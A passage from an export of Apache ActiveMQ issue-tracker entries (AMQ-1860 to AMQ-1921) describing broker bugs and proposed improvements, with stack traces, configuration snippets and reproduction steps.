Browsing a queue aggressively ( ie repeatedly with high frequency ) that is also experiencing message production and consumption results in some messages failing to be delivered to pre-registered consumers.  Messages are visible on the queue to new consumers, but not pre-existing ones.I"ve attached a junit test case that show this behaviour.  Note that since this is a race condition, it manifests sporadically.  You may need to run the test a few times before it fails.The interesting bit is the method testProducerBrowserConsumer().  This sets up a couple of message producers, a message consumer, and a message browser on the same queue.  The producers send a known number of messages on the queue while the browsers creates a number of queue browsers and iterates through the contents.  The consumer pulls messages from the queue using a receive method set to time out after 30 sec.  Once the consumer exits, we start a cleanup consumer to process any remaining messages on the queue.  There should be zero messages outstanding.  This is often not the case.  I"ve modified the test case, originally, we just asserted that we had received the sent number of messages.  I added the cleanup receiver to demonstrate that new consumers on the queue can see messages that pre-existing ones do not.
issueID:AMQ-1860
type:Bug
changed files:TcpTransportServer.java
texts:soTimeout transport property- Incorrect documentation (or code, you pick)
The documentation for TCP transport, shows soTimeout, connectionTimeout and socketBufferSize as properties without a prefix.The code in TcpTransportServer.java doesn"t have the support for these properties.hence setting a URL to tcp://192.168.3.3:61616?soTimeout=180000 does nothing, and defaults to soTimeout=0 (which is a bad value due to how sockets get closed, and can cause the system to hang on  a socketWrite call, causing the rest of the server to hang, but I can explain that on the dev lists for those interested)Bug description: Transport properties are incorrectly document or implementedThere are two solutions to this bug:1. The preferred, would be to fix the documentationhttp://activemq.apache.org/tcp-transport-reference.htmlthe mentioned options will work if they are prefixed with "transport."so the URL would be tcp://192.168.3.3:61616?transport.soTimeout=1800002. Add the properties with their getters/setters into TcpTransportServer.java and then during the handleSocket method add them to the options mapPlease note, this bug refers to the soTimeout setting on the socket that gets created on the server when a producer/consumer connects in using TCPbestFilip
issueID:AMQ-1865
type:Bug
changed files:
texts:pom parent version miss match
i check the svn revision 678620 to do camel loading test, but pom.xml is missmatch with parent"s.the pom.xml  in activemq-camel-loadtest  <parent>    <groupId>org.apache.activemq</groupId>    <artifactId>activemq-parent</artifactId>    <version>5.1-SNAPSHOT</version>  </parent>the pom.xml in activemq  <groupId>org.apache.activemq</groupId>  <artifactId>activemq-parent</artifactId>  <version>5.2-SNAPSHOT</version>  <packaging>pom</packaging>  <name>ActiveMQ</name>I try to modify the version 5.1 to 5.2 OR 5.2 to 5.1 but all the things cannot run.
issueID:AMQ-1866
type:Bug
changed files:Queue.java
BaseDestination.java
PrefetchSubscription.java
texts:Muliple consumers on a queue and only run as fast as the slowest consumer
Muliple consumers on a queue and only run as fast as the slowest consumer
issueID:AMQ-1867
type:Bug
changed files:MemoryMonitoringTool.java
ReportGenerator.java
texts:memtest report is not well-formatted xml
In the output of the memtest, some attributes are not quoted.
issueID:AMQ-1869
type:Improvement
changed files:
texts:Upgrade to camel 1.4.0
None
issueID:AMQ-1870
type:Bug
changed files:DefaultJDBCAdapter.java
texts:JDBC exception when sending and receiving a lot of messages (MySQL 5 in use for persistence)
The number of messages that were on the queue was approx 3 million when this exception happened. Would it be possible to modify the code so that the setMaxRows value is kept to a much lower number?java.sql.SQLException: setMaxRows() out of range. 50871918 > 50000000.        at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1055)        at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:956)        at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:926)        at com.mysql.jdbc.StatementImpl.setMaxRows(StatementImpl.java:2412)        at org.apache.commons.dbcp.DelegatingStatement.setMaxRows(DelegatingStatement.java:186)        at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doRecoverNextMessages(DefaultJDBCAdapter.java:703)        at org.apache.activemq.store.jdbc.JDBCMessageStore.recoverNextMessages(JDBCMessageStore.java:230)        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:83)        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:75)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:188)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:104)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:136)        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1092)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1178)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:956)        at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84)        at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
issueID:AMQ-1872
type:Bug
changed files:HashIndex.java
texts:ArrayIndexOutOfBoundsException on restart of broker with durable subscriptions
We have two brokers A & B, with a producer on A and durable subscriber on B. A sends 50K messages and B consumes 25K messages. Then broker B is shutdown. We then restart Broker B and restablish the durable subscription.We are seeing Broker B throwing the following array out of bounds exception when cleaning up the persistent adapter indexes after the consumer reconnects to the restarted broker B.Caused by: java.lang.ArrayIndexOutOfBoundsException        at java.lang.System.arraycopy(Native Method)        at org.apache.activemq.kaha.impl.index.hash.HashIndex.addToBin(HashIndex.java:431)        at org.apache.activemq.kaha.impl.index.hash.HashIndex.doLoad(HashIndex.java:497)        at org.apache.activemq.kaha.impl.index.hash.HashIndex.doCompress(HashIndex.java:535)        at org.apache.activemq.kaha.impl.index.hash.HashIndex.load(HashIndex.java:253)        at org.apache.activemq.kaha.impl.container.MapContainerImpl.load(MapContainerImpl.java:107)        at org.apache.activemq.store.kahadaptor.KahaReferenceStoreAdapter.getMapReferenceContainer(KahaReferenceStoreAdapter.java:210)        at org.apache.activemq.store.kahadaptor.KahaReferenceStoreAdapter.createTopicReferenceStore(KahaReferenceStoreAdapter.java:168)        at org.apache.activemq.store.amq.AMQPersistenceAdapter.createTopicMessageStore(AMQPersistenceAdapter.java:461)        at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:94)        at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:425)        at org.apache.activemq.broker.jmx.ManagedTopicRegion.createDestination(ManagedTopicRegion.java:56)        at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:120)        at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:266)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:141)        at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:147)        at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:141)        at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:148)        at org.apache.activemq.broker.region.AbstractRegion.lookup(AbstractRegion.java:385)        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:67)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:383)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:85)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:92)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:529)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:345)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:293)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)        ... 1 more
issueID:AMQ-1873
type:Bug
changed files:
texts:Stomp connections doesn&#39;t seem to be released cleanly (Too many open files error)
I"m actually testing ActiveMQ with a python stomp Client (stomp.py http://www.briggs.net.nz/log/projects/stomppy/).I"m trying to load the broker with ~200 producers (on ~200 hosts) feeding one TOPIC for only one consumer.Everything is working almost fine until the client connection fails.The ActiveMQ log displays :...2008-07-30 09:28:43,665 &#91;localhost:61613&#93; ERROR TransportConnector             - Could not accept connection : Too many open files2008-07-30 09:28:43,665 &#91;localhost:61613&#93; DEBUG TransportConnector             - Reason: Too many open filesjava.net.SocketException: Too many open files at java.net.PlainSocketImpl.socketAccept(Native Method) at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384) at java.net.ServerSocket.implAccept(ServerSocket.java:450) at java.net.ServerSocket.accept(ServerSocket.java:421) at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:221) at java.lang.Thread.run(Thread.java:595)When I look at the open files (or connections) (with lsof) I see 65446 lines like :java    26765 root *066u  sock        0,4          7534034 can"t identify protocolThis seems to indicate that ActiveMQ doesn"t totally released the UNIX socketI"m attaching the activemq.xml conf file.
issueID:AMQ-1874
type:New Feature
changed files:StompSubscription.java
ProtocolConverter.java
Stomp.java
texts:Added additional Stomp SUBSCRIBE ack mode for acknowledging out-of-order individual message-IDs
Current Behavior:   Given that a Stomp client SUBSCRIBEs to a queue with the ack mode set to "client";   Scenario 1:   Some producer send messages and the Stomp Subscriber receives the ff. messages in order:       Msg1       Msg2       Msg3   ACK Msg1 will acknowledge just Msg1. This is a simple and obvious behavior.   ACK Msg2,  ACK Msg3 should behave normal.   ====   Scenario 2:   Some producer send messages and the Stomp Subscriber receives the ff. messages in order:       Msg1       Msg2       Msg3   Trying to do an ACK Msg2 will acknowledge both Msg1 and Msg2. Any attempt to ACK Msg1 will result in an Unexpected ACK error frame.   ACK Msg3 will succeed.   ====   Scenario 3:   Again, some producer send messages and the Stomp Subscriber receives the ff. messages in order:       Msg1       Msg2       Msg3   Trying to ACK Msg3 will acknowledge ALL messages at once. ACK Msg2 or Msg 1 will raise an exception if attempted.    ====   The Stomp specs at http://stomp.codehaus.org/Protocol does not detail the ack behavior nor does it recommend or hint anything.Proposed Patch:   Introduce a new ack mode in Stomp SUBSCRIBE header:   In the attached patch, the chosen header is called "client-individual"; to reflect that ACKs are still client initiated PLUS "individual" to    declare that the client intends to acknowledge individual messages by message-id, not in batches as with simple "client" ack mode.   Kindly suggest a another header name if you can think of a more appropriate one.   References:        https://issues.apache.org/activemq/browse/AMQ-1732Thank you.===========Dexter Tad-y
issueID:AMQ-1878
type:Bug
changed files:Queue.java
texts:Deadlock in broker can occur when optimised dispatch is true
As an experiment in my application, I set optimised dispatch to be true for the broker and discovered during the startup of my application, a deadlock could occur.  The problem is the classic lock hierarchy issue, one thread has asked for lock A then B, another has asked for lock B then A.I"ve attached an annotated jstack output with just the deadlock information, annotated with the locks involved.  I have also added a patch which seems to resolve the issue, but I can"t be sure if the change has other ramifications.The problem in a nutshell is one thread calls Queue.addSubscription(), which locks dispatchLock, and then calls wakeup/iterate() which blocks on iteratingMutex.Another thread meanwhile has called Queue.send(), which locks iteratingMutex via wakeup/iterate(), but then tries to call doPageIn() which requires dispatchLock.It seems to me addSubscription() doesn"t need to hold on to dispatchLock while calling wakeup/iterate(), so I moved the wakeup() outside the usage of dispatchLock.  This ensures the lock heirarchy between iteratingMutex and dispatchLock is always obtained in the same order.  removeSubscription() has the same issue.
issueID:AMQ-1882
type:Bug
changed files:
texts:PurgeTest doe not close message producer
As the code snippet &#91;1&#93; shows, PurgeTest.testPurge() doe not close message producer before leaving the method.&#91;1&#93;http://www.google.com/codesearch?hl=en&q=lang:java+send+javax.jms.MessageProducer+show:FsSHqpp0HvE:q1E2Dv_MIx4:x48KcFcDtxM&sa=N&ct=rx&cd=5&cs_p=http://apache.osuosl.org/activemq/apache-activemq/4.1.1/apache-activemq-4.1.1-src.zip&cs_f=apache-activemq-4.1.1/src/activemq-core/src/test/java/org/apache/activemq/broker/jmx/PurgeTest.java&cs_p=http://apache.osuosl.org/activemq/apache-activemq/4.1.1/apache-activemq-4.1.1-src.zip&cs_f=apache-activemq-4.1.1/src/activemq-core/src/test/java/org/apache/activemq/broker/jmx/PurgeTest.java
issueID:AMQ-1885
type:Bug
changed files:
texts:The jdbc lockKeepAlive thread should be started only if current broker instance successfully started and became a master
using jdbc persistence with master/slave sharing the database. If the db dies, the master dies when it sees its lock expire. unfortunately the slave also has a lockKeepalive thread that detects the db failure, even if it does not have the lock.The lockKeepAlive thread should be used once a lock has been acquired. in this way, the slave can remain trying to acquire the lock and eventually succeed and promote its self to master when the db comes back up.
issueID:AMQ-1886
type:Bug
changed files:
texts:Transactions used in a JDBC store WITHOUT a journal will not commit the UOW in an atomic operation
The JDBC store"s primary use case has always been to be used in conjunction with the journal.  When the journal is in place it recovers any partially committed transaction and makes the JDBC store consistent.  When the journal is not used, for example when you are setting up an HA solution with an HA JDBC database, then it has been noticed that on a DB failure you may get partial commits of JMS transactions.
issueID:AMQ-1887
type:Improvement
changed files:
texts:Wrap the debugging variables in conditional expressions to enable them easier
The activemq shell script for startup contains some variables for debugging, but they are commented out. This requires hand editing instead of just setting a variable on the command line to conditionally. So I wrapped the debug variables in conditionals to make it easier to enable debugging features. So now if I want to enable remote debugging on ActiveMQ, I do the following: [apache-activemq-5.1.0] $ ACTIVEMQ_DEBUG=true ./bin/activemq Listening for transport dt_socket at address: 5005ACTIVEMQ_HOME: /Users/bsnyder/amq/apache-activemq-5.1.0ACTIVEMQ_BASE: /Users/bsnyder/amq/apache-activemq-5.1.0Loading message broker from: xbean:activemq.xml...Remote debugging and YourKit debugging can now be enabled easily without a requirement to edit the script.
issueID:AMQ-1889
type:Bug
changed files:Topic.java
texts:Usage leak in broker when subscribing to a topic using selector
Original reported in the mailing listOriginal report notices the problem with noLocal, but I belive that the usage leak when any selector is used.
issueID:AMQ-1890
type:Bug
changed files:
texts:Stomp - remove durable subscriber
UNSUBSCRIBE command for durable subscribers does not work. Patch contains only test case at the moment.
issueID:AMQ-1891
type:Improvement
changed files:MySqlJDBCAdapter.java
texts:MySQL DB tables should be INNODB based for proper tx support.
None
issueID:AMQ-1892
type:New Feature
changed files:DiscardingDLQBrokerPlugin.java
DiscardingDLQBroker.java
texts:Broker plugin to allow automatic discarding of the items being sent to the dead letter queue
A very simple, yet very useful plugin to the broker. This allows one to configure queues and topics, all or matched based on regular expressions, to drop messages being sent to the DLQextremely useful when one uses constant pending message limit strategy or the other eviction rules, but don"t want to incur the overhead of yet another consumer to clear the DLQConfiguration looks like     <plugins>       <bean         xmlns="http://www.springframework.org/schema/beans"         id="discardingDlqBroker"         class="org.apache.activemq.plugin.DiscardingDLQBroker">         <property name="dropAll" value="true"/>         <property name="dropTemporaryTopics" value="true"/>         <property name="dropTemporaryQueues" value="true"/>         <!--drops by destination name, using java regular expressions             http://java.sun.com/j2se/1.5.0/docs/api/java/util/regex/Pattern.html             delimited by spaces, so destination names cannot contain spaces         <property name="dropOnly" value="topic_1 queue_1"/>         -->         <!-how frequently do we output how many messages we have dropped - use 0 for disable->         <property name="reportInterval" value="1000"/>       </bean>     </plugins>
issueID:AMQ-1893
type:Bug
changed files:
texts:consumer stop consuming message when using selector,what&#39;s the problem?
1. Start ActiveMQ 5.0 or 5.1 using the activemq.xml config file uploaded.2. Run TestProducer3. Open Browser : http://localhost:8165/admin，enter "Queues" page,you can see now the "Number of Pending Messages" of queue "TEST" is 30000.4. Run TestConsumer,5. The Consumer will stop consuming messages, now you refresh the "Queues" page, the "Number of Pending Messages" is large than zeroThat"s The problem, but why? Is the problem in my code or in ActiveMQ?
issueID:AMQ-1894
type:Improvement
changed files:activemq-scalability.xml
activemq-throughput.xml
MessageDatabase.java
texts:Slim down the activemq.xml to focus on production config v. feature demonstration
I have slimmed down the default activemq.xml so it focuses more on a minimal production style configuration instead of a demonstration of features. My thoughts on this are that the goal of providing a good default config and the goal of demonstrating features should be represented separately. This is as simple as paring down the amount of items in the default XML config and moving some of the items that demonstrate what you can do in the XML config to a separate config file. I"ve also done this and named the feature demo config activemq-demo.xml. I"ve also added many more comments to further document each config option. Attached are the diffs.
issueID:AMQ-1895
type:Bug
changed files:
texts:activemq.xml embedded camel context cannot resolve  a broker if port other than default(61616) is used for tcp transport
The camel context defined in acrtivemq.xml  does not specify a camel activeMQComponent (where a brokerUrl could be specified) and hence false back to the use of the default broker URL from ActiveMQConnectionFactory. This breaks down when a non default port is specified for the broker.The result is the camel context continually retrying to connect to a non existent port.It may make sense to pull the camel context out of the default activemq.xml altogether but with it present, it may make sense to have the camel activmqcomponent use a default broker url that uses the vm transport as the context will always be embedded in a broker.One issue with the use of vm transport is that the first use of the transport creates an embedded broker. With the xbean xml, the camel context bean starts before the brokerService so the result is two brokers.It would be usefull if the vm transport url allowed an option to wait for a broker to start so that the camel context can reliably use the vm transport without the possibility of creating a separate embedded broker.Something like the following would work: vm://localhost?waitForStart=10000&create=false In this way, the camel embedded connection factory would wait up to 10 seconds for the localhost broker to start and fail with an exception (b/c create=false) in the event that the broker does not start within that time.This would be a sensible default url for the activemq camel component in the acrtivemq.xml such that it is independent of transport options used by the broker.(The spring depends-on workaround for this ordering dependency only works in a complete spring context)    <bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent" >        <property name="brokerURL" value="vm://localhost?waitForStart=10000&create=false" />    </bean>
issueID:AMQ-1898
type:Bug
changed files:MessageQuery.java
texts:Invalid number of consumers in web reporting
Here are the steps to reproduce it:1) Create a queue with a number of messages (persistent or not) and no consumers on that queue.2) Go to your web reporting page then click on that queue (browse it)3) Browse any of the messages (like try to read its contents). 4) Now go back to the Queues pageYou"ll see the number of consumers increased by 3 each time you do that. And these consumers aren"t REAL consumers. They"re only there to show you the message, but they won"t consume the message.
issueID:AMQ-1899
type:Bug
changed files:DestinationFacade.java
texts:Sending without entering a queue name creates an empty queue with a message into it
Here is how to reproduce it:1) Click on send in the top menu2) Then click the send button without entering any information.It will create a queue with the message into it, but the queue name is empty and I am not sure about the accessibility of this queue.
issueID:AMQ-1900
type:Bug
changed files:PrefetchSubscription.java
texts:Web-Console viewing a message increments the messages received counter
Here is how to reproduce the bug:1) Browse to a queue2) Click on any message to view the message3) Then go back to the Queues statistics pageYou"ll see that the number of received messages increased by 1 although there aren"t any actual received messages
issueID:AMQ-1901
type:Improvement
changed files:AMQPersistenceAdapterFactory.java
AMQPersistenceAdapter.java
texts:The reference store is always deleted on a hard shutdown - make this optional
Add two new properties to amqPersistenceAdaptor :recoverReferenceStore - default = true - will recover if not validforceRecoverReferenceStore - default force - will force a recoveryAlways recovering the reference store can be over zealous - making this optional
issueID:AMQ-1902
type:Bug
changed files:
texts:org.apache.activemq.broker.region.cursors.CursorQueueStoreTest often fails
-------------------------------------------------------------------------------Test set: org.apache.activemq.broker.region.cursors.CursorQueueStoreTest-------------------------------------------------------------------------------Tests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 26.706 sec <<< FAILURE!testSendWhilstConaume(org.apache.activemq.broker.region.cursors.CursorQueueStoreTest)  Time elapsed: 26.686 sec  <<< FAILURE!junit.framework.ComparisonFailure: This should be the same at pos 50 in the list expected:<...51> but was:<...109> at junit.framework.Assert.assertEquals(Assert.java:81) at org.apache.activemq.broker.region.cursors.CursorSupport.testSendWhilstConaume(CursorSupport.java:150) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at junit.framework.TestCase.runTest(TestCase.java:154) at junit.framework.TestCase.runBare(TestCase.java:127) at junit.framework.TestResult$1.protect(TestResult.java:106) at junit.framework.TestResult.runProtected(TestResult.java:124) at junit.framework.TestResult.run(TestResult.java:109) at junit.framework.TestCase.run(TestCase.java:118) at junit.framework.TestSuite.runTest(TestSuite.java:208) at junit.framework.TestSuite.run(TestSuite.java:203) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160) at org.apache.maven.surefire.Surefire.run(Surefire.java:81) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182) at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)
issueID:AMQ-1904
type:Improvement
changed files:
texts:JMX DestinationViewMBean.browse() returns CompositeData which does not expose the user properties other than as a String
in addition some other properties should be exposed such as JMSXGroupID and JMSXGroupSeq
issueID:AMQ-1905
type:Improvement
changed files:
texts:Method required: ObjectName[] ConnectionViewMBean.getConsumers()
this would allow us in a JMX console to navigate from a connection to its consumers
issueID:AMQ-1907
type:Improvement
changed files:
texts:method required:  ObjectName SubscriptionViewMBean.getConnection()
then in JMX tools we can havigate from a subscription to the connection
issueID:AMQ-1908
type:Improvement
changed files:QueueViewMBean.java
QueueView.java
texts:add retryMessage() method to QueueViewMBean to make it easy to retry a DLQ message
None
issueID:AMQ-1909
type:Bug
changed files:
texts:QueueViewMBean.retryMessage() often seems to fail without retrying
Seems kinda easy to reproduce (e.g. the FUSE Web Console gets this each time)
issueID:AMQ-1911
type:Bug
changed files:
texts:Kaha store can not retrieve messages with non ASCII charcaters
Scenario:A client with the host name "meißen" (German special character ß aka sz) sends an ObjectMessage to a persistent queue.This message goes from the client to the broker and from the broker to the kaha store without problems.After that, the broker cannot read it from the kaha store. Error message:ERROR 2008-08-21 12:14:10.906       AbstractStoreCursor - Failed to fill batchjava.io.IOException: Failed to read to journal for: offset = 4770274, file = 9, size = 2317, type = 0. Reason: java.io.UTFDataFormatException: bad string  at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33)  at org.apache.activemq.store.amq.AMQPersistenceAdapter.createReadException(AMQPersistenceAdapter.java:637)  at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:523)  at org.apache.activemq.store.amq.AMQMessageStore.getMessage(AMQMessageStore.java:432)  at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:54)  at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:82)  at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverNextMessages(KahaReferenceStore.java:120)  at org.apache.activemq.store.amq.AMQMessageStore.recoverNextMessages(AMQMessageStore.java:533)  at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:75)  at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:188)  at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:104)  at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:136)  at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1108)  at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1196)  at org.apache.activemq.broker.region.Queue.iterate(Queue.java:951)  at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84)  at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41)  at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)  at java.lang.Thread.run(Thread.java:619)Caused by: java.io.UTFDataFormatException: bad string  at org.apache.activemq.util.DataByteArrayInputStream.readUTF(DataByteArrayInputStream.java:286)  at org.apache.activemq.openwire.v3.BaseDataStreamMarshaller.looseUnmarshalString(BaseDataStreamMarshaller.java:572)  at org.apache.activemq.openwire.v3.ProducerIdMarshaller.looseUnmarshal(ProducerIdMarshaller.java:115)  at org.apache.activemq.openwire.OpenWireFormat.looseUnmarshalNestedObject(OpenWireFormat.java:471)  at org.apache.activemq.openwire.v3.BaseDataStreamMarshaller.looseUnmarsalCachedObject(BaseDataStreamMarshaller.java:488)  at org.apache.activemq.openwire.v3.MessageIdMarshaller.looseUnmarshal(MessageIdMarshaller.java:115)  at org.apache.activemq.openwire.OpenWireFormat.looseUnmarshalNestedObject(OpenWireFormat.java:471)  at org.apache.activemq.openwire.v3.BaseDataStreamMarshaller.looseUnmarsalNestedObject(BaseDataStreamMarshaller.java:467)  at org.apache.activemq.openwire.v3.MessageMarshaller.looseUnmarshal(MessageMarshaller.java:210)  at org.apache.activemq.openwire.v3.ActiveMQMessageMarshaller.looseUnmarshal(ActiveMQMessageMarshaller.java:102)  at org.apache.activemq.openwire.v3.ActiveMQObjectMessageMarshaller.looseUnmarshal(ActiveMQObjectMessageMarshaller.java:102)  at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:364)  at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:204)  at org.apache.activemq.store.amq.AMQPersistenceAdapter.readCommand(AMQPersistenceAdapter.java:521)  ... 17 moreERROR 2008-08-21 12:14:10.906       AbstractStoreCursor - Failed to fill batchUnfortunately the problem occurs first in the broker. This makes it very difficult to find out the real cause of the problem, the host name with a special character.Further on it is not possible to recover from this problem and even worse all new messages which are put into this kaha store will be also lost.Special characters within the message (TextMessage, MappedMessage and ObjectMessage seems to be ok.
issueID:AMQ-1915
type:Bug
changed files:ActiveMQConnectionFactory.java
texts:ActiveMQConnectionFactory.setExclusiveConsumer has no effect
Creating an ActiveMQConnectionFactory, and then calling setExclusiveConsumer(true), does not cause queues created from that factory"s connections to have the exclusive consumer feature. I"m pretty sure this is due to configureConnection() not calling setExclusiveConsumer() on new connections. This can be seen in the source code for ActiveMQConnectionFactory.configureConnection, release 5.1.
issueID:AMQ-1917
type:Bug
changed files:
texts:Broker Client with spring jmsTemplate drops messages (if reveiveTimeout is used) or blocks (if receiveTimeout is not specified.) under heavy load.
doing request reply with spring jms template results in a hang or loss of messages when there are multiple concurrent requests, ie: when under load.the problem is seen with servicemix-jms jmsProviderEndpoint which uses spring jmsTemplate based client to talk to ActiveMQ and blocks under heavy load after certain time on receiving message. Message can be seen on the queue but sprinjms based client using receiveSelected() call to receive message based on JMSCorrelationID based selector waits for the message and eventually will timeout (if one set) or block indefinitely.
issueID:AMQ-1918
type:Bug
changed files:BrokerService.java
DefaultJDBCAdapter.java
texts:AbstractStoreCursor.size gets out of synch with Store size and blocks consumers
In version 5.1.0, we are seeing our queue consumers stop consuming for no reason.We have a staged queue environment and we occasionally see one queue display negative pending message counts that hang around -x, rise to -x+n gradually and then fall back to -x abruptly. The messages are building up and being processed in bunches but its not easy to see because the counts are negative. We see this behavior in the messages coming out of the system. Outbound messages come out in bunches and are synchronized with the queue pending count dropping to -x.This issue does not happen ALL of the time. It happens about once a week and the only way to fix it is to bounce the broker. It doesn"t happen to the same queue everytime, so it is not our consuming code.Although we don"t have a reproducible scenario, we have been able to debug the issue in our test environment.We traced the problem to the cached store size in the AbstractStoreCursor.This value becomes 0 or negative and prevents the AbstractStoreCursor from retrieving more messages from the store. (see AbstractStoreCursor.fillBatch() )We have seen size value go lower than -1000.We have also forced it to fix itself by sending in n+1 messages. Once the size goes above zero, the cached value is refreshed and things work ok again.Unfortunately, during low volume times, it could be hours before n+1 messages are received, so our message latency can rise during low volume times.... I have attached our broker config.
issueID:AMQ-1919
type:Improvement
changed files:ActiveMQConnection.java
texts:connection.createSession(false, Session.SESSION_TRANSACTED) should throw an exception?
sounds dodgy to me - would have thought an exception is better?
issueID:AMQ-1921
type:Bug
changed files:
texts:Trunk build is broken due to dependence on XBean 3.3
